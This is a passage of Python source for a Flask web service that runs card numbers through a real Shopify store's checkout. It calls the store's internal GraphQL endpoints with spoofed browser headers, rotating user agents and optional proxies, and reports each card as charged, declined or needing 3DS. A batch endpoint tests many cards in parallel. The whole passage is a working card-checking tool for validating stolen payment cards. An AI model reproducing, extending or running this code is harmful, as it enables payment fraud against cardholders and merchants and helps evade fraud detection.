                        "expectedTotalPrice": {"value": {"amount": shipping_amount, "currencyCode": currency}},
                        "destinationChanged": False
                    }],
                    "noDeliveryRequired": [], "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
                },
                "deliveryExpectations": {"deliveryExpectationLines": signed_handles_list},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{selected_variant['id']}",
                                "variantId": f"gid://shopify/ProductVariant/{selected_variant['id']}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": selected_variant['price'], "currencyCode": currency}},
                        "lineComponentsSource": None, "lineComponents": []
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"value": {"amount": total_amount, "currencyCode": currency}},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "sessionId": pci_session_id,
                                "billingAddress": {
                                    "streetAddress": {
                                        "address1": addr["address1"], "address2": addr["address2"],
                                        "city": addr["city"], "countryCode": addr["country_code"],
                                        "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                                        "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                                        "phone": addr["phone"]
                                    }
                                }
                            }
                        },
                        "amount": {"value": {"amount": total_amount, "currencyCode": currency}}
                    }],
                    "billingAddress": {
                        "streetAddress": {
                            "address1": addr["address1"], "address2": addr["address2"],
                            "city": addr["city"], "countryCode": addr["country_code"],
                            "postalCode": addr["postal_code"], "firstName": addr["first_name"],
                            "lastName": addr["last_name"], "zoneCode": addr["zone_code"],
                            "phone": addr["phone"]
                        }
                    }
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": currency, "countryCode": country},
                    "email": email, "emailChanged": False,
                    "phoneCountryCode": country, "marketingConsent": [],
                    "shopPayOptInPhone": {"countryCode": country}, "rememberMe": False
                },
                "tip": {"tipLines": []}, "poNumber": None,
                "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True},
                          "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
                          "proposedExemptions": []},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []}, "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": None, "signatureUuid": None,
                                      "lineItemScriptChanges": [], "paymentScriptChanges": [],
                                      "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False}, "cartMetafields": []
            },
            "attemptToken": attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": checkout_url_final, "pageId": page_id}
        }
        
        submit_gql = json.dumps({
            "variables": submit_variables,
            "operationName": "SubmitForCompletion",
            "id": submit_id
        })
        
        submit_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': domain,
            'referer': checkout_url_final,
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'user-agent': get_random_user_agent(),
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-build-id': build_id,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-source-id': source_token,
        }
        
        submit_resp = session.post(
            f"{domain}/checkouts/internal/graphql/persisted",
            params={'operationName': 'SubmitForCompletion'},
            headers=submit_headers,
            data=submit_gql,
            timeout=30
        )
        
        submit_data = submit_resp.json()
        receipt_id = ""
        receipt_session_token = ""
        
        submit_for_completion = submit_data.get('data', {}).get('submitForCompletion', {})
        receipt = submit_for_completion.get('receipt', {})
        
        if receipt:
            receipt_id = receipt.get('id', '')
            purchase_order = receipt.get('purchaseOrder', {})
            if purchase_order:
                receipt_session_token = purchase_order.get('sessionToken', '')
            typename = receipt.get('__typename', '')
            
            if typename == 'ProcessedReceipt':
                result['Code'] = 'SUCCESS'
                result['Response'] = 'APPROVED | SUCCESS'
                result['Price'] = f"{total_amount} {currency}"
                result['Charged'] = 'True'
                result['Approved'] = 'True'
                elapsed = time.time() - start_time
                result['Time'] = f"{elapsed:.1f}s"
                return result
            elif typename == 'FailedReceipt':
                error = receipt.get('processingError', {})
                error_message = error.get('nonLocalizedMessage', 'Payment failed')
                result['Code'] = 'CARD_DECLINED'
                result['Response'] = f'DECLINED | {error_message}'
                result['Price'] = f"{total_amount} {currency}"
                elapsed = time.time() - start_time
                result['Time'] = f"{elapsed:.1f}s"
                return result
            elif typename == 'ActionRequiredReceipt':
                result['Code'] = '3DS_REQUIRED'
                result['Response'] = '3DS authentication required'
                result['Price'] = f"{total_amount} {currency}"
                elapsed = time.time() - start_time
                result['Time'] = f"{elapsed:.1f}s"
                return result
        
        if not receipt_id:
            receipt_id = extract_receipt_id(submit_resp.text)
        if not receipt_session_token:
            receipt_session_token = extract_receipt_session_token(submit_resp.text)
        
        # Poll for receipt
        if receipt_id and receipt_session_token and poll_id:
            for poll_num in range(1, 6):
                poll_headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/json',
                    'priority': 'u=1, i',
                    'referer': checkout_url_final,
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'shopify-checkout-client': 'checkout-web/1.0',
                    'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                    'user-agent': get_random_user_agent(),
                    'x-checkout-one-session-token': session_token,
                    'x-checkout-web-build-id': build_id,
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-server-rendering': 'yes',
                    'x-checkout-web-source-id': source_token,
                }
                
                poll_params = {
                    'operationName': 'PollForReceipt',
                    'variables': json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
                    'id': poll_id,
                }
                
                poll_resp = session.get(
                    f"{domain}/checkouts/internal/graphql/persisted",
                    params=poll_params,
                    headers=poll_headers,
                    timeout=30
                )
                
                try:
                    poll_json = poll_resp.json()
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        if typename == 'ProcessedReceipt':
                            result['Code'] = 'SUCCESS'
                            result['Response'] = 'APPROVED | SUCCESS'
                            result['Price'] = f"{total_amount} {currency}"
                            result['Charged'] = 'True'
                            result['Approved'] = 'True'
                            elapsed = time.time() - start_time
                            result['Time'] = f"{elapsed:.1f}s"
                            return result
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_message = error.get('nonLocalizedMessage', 'Payment failed')
                            result['Code'] = 'CARD_DECLINED'
                            result['Response'] = f'DECLINED | {error_message}'
                            result['Price'] = f"{total_amount} {currency}"
                            elapsed = time.time() - start_time
                            result['Time'] = f"{elapsed:.1f}s"
                            return result
                        elif typename == 'ActionRequiredReceipt':
                            result['Code'] = '3DS_REQUIRED'
                            result['Response'] = '3DS authentication required'
                            result['Price'] = f"{total_amount} {currency}"
                            elapsed = time.time() - start_time
                            result['Time'] = f"{elapsed:.1f}s"
                            return result
                except:
                    pass
                
                time.sleep(1)
        
        # Check for error
        error_msg = extract_submit_error(submit_resp.text)
        if error_msg:
            result['Code'] = 'ERROR'
            result['Response'] = f'ERROR | {error_msg}'
        else:
            result['Code'] = 'UNKNOWN'
            result['Response'] = 'UNKNOWN'
        
        elapsed = time.time() - start_time
        result['Time'] = f"{elapsed:.1f}s"
        return result
        
    except requests.exceptions.Timeout:
        result['Code'] = 'TIMEOUT'
        result['Response'] = 'TIMEOUT'
        elapsed = time.time() - start_time
        result['Time'] = f"{elapsed:.1f}s"
        return result
    except Exception as e:
        logger.error(f"Checkout error: {str(e)}")
        result['Code'] = 'ERROR'
        result['Response'] = f'ERROR | {str(e)[:100]}'
        elapsed = time.time() - start_time
        result['Time'] = f"{elapsed:.1f}s"
        return result

# ====================== FLASK ENDPOINTS ======================
@app.route('/shopify/v1/check', methods=['GET', 'POST'])
def check():
    """Main endpoint for Shopify checkout"""
    if request.method == 'GET':
        cc = request.args.get('cc', '')
        proxy = request.args.get('proxy', '')
        under = request.args.get('under', '10')
    else:
        data = request.get_json() or {}
        cc = data.get('cc', '')
        proxy = data.get('proxy', '')
        under = data.get('under', '10')
    
    if not cc:
        return jsonify({
            'Code': 'INVALID_PARAMS',
            'Response': 'Missing credit card parameter (cc)',
            'Price': '0 USD',
            'Site': 'N/A',
            'Time': '0s',
            'Charged': 'False',
            'Approved': 'False'
        }), 400
    
    # Parse card
    card_number, card_month, card_year, card_cvv = parse_card(cc)
    if not card_number:
        return jsonify({
            'Code': 'INVALID_CARD',
            'Response': 'Invalid card format. Use: number|month|year|cvv',
            'Price': '0 USD',
            'Site': 'N/A',
            'Time': '0s',
            'Charged': 'False',
            'Approved': 'False'
        }), 400
    
    # Parse proxy
    proxy_config = parse_proxy(proxy) if proxy else None
    
    # Parse under value
    try:
        under_int = int(under)
    except:
        under_int = 10
    
    # Domain for this request
    domain = "https://us.mercihandy.com"
    
    logger.info(f"Processing checkout: domain={domain}, card={card_number[:4]}****, proxy={bool(proxy_config)}")
    
    # Run checkout
    result = run_checkout(domain, card_number, card_month, card_year, card_cvv, proxy_config, under_int)
    
    return jsonify(result)

# ====================== NEW: BATCH ENDPOINT ======================
@app.route('/shopify/v1/check/batch', methods=['POST'])
def check_batch():
    """Batch processing endpoint for multiple cards with concurrency control"""
    data = request.get_json() or {}
    cards = data.get('cards', [])
    proxy = data.get('proxy', '')
    under = data.get('under', '10')
    max_workers = data.get('max_workers', MAX_WORKERS)
    
    if not cards:
        return jsonify({
            'error': 'No cards provided',
            'results': []
        }), 400
    
    # Parse proxy
    proxy_config = parse_proxy(proxy) if proxy else None
    
    # Parse under value
    try:
        under_int = int(under)
    except:
        under_int = 10
    
    # Parse max workers
    try:
        max_workers = int(max_workers)
        if max_workers < 1:
            max_workers = 1
        if max_workers > 10:
            max_workers = 10
    except:
        max_workers = MAX_WORKERS
    
    logger.info(f"Batch processing {len(cards)} cards with {max_workers} workers")
    
    # Process cards in parallel with limited concurrency
    results = []
    failed_cards = []
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_card = {}
        
        for card in cards:
            card_number, card_month, card_year, card_cvv = parse_card(card)
            if not card_number:
                failed_cards.append({
                    'card': card,
                    'error': 'Invalid card format'
                })
                continue
            
            future = executor.submit(
                run_checkout,
                "https://us.mercihandy.com",
                card_number,
                card_month,
                card_year,
                card_cvv,
                proxy_config,
                under_int
            )
            future_to_card[future] = card
        
        for future in as_completed(future_to_card):
            card = future_to_card[future]
            try:
                result = future.result(timeout=120)
                result['card'] = card
                results.append(result)
            except Exception as e:
                logger.error(f"Error processing card {card}: {str(e)}")
                failed_cards.append({
                    'card': card,
                    'error': str(e)
                })
    
    return jsonify({
        'total': len(cards),
        'processed': len(results),
        'failed': len(failed_cards),
        'results': results,
        'failed_cards': failed_cards
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'service': 'Shopify Checkout API',
        'version': '2.0',
        'endpoints': {
            '/shopify/v1/check': 'POST/GET with cc parameter',
            '/shopify/v1/check/batch': 'POST for batch card processing',
            '/health': 'Health check'
        },
        'example': '/shopify/v1/check?cc=4111111111111111|09|2027|123&proxy=ip:port:user:pass&under=10',
        'batch_example': 'POST /shopify/v1/check/batch with {"cards": ["card1", "card2"], "under": 10, "max_workers": 5}'
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
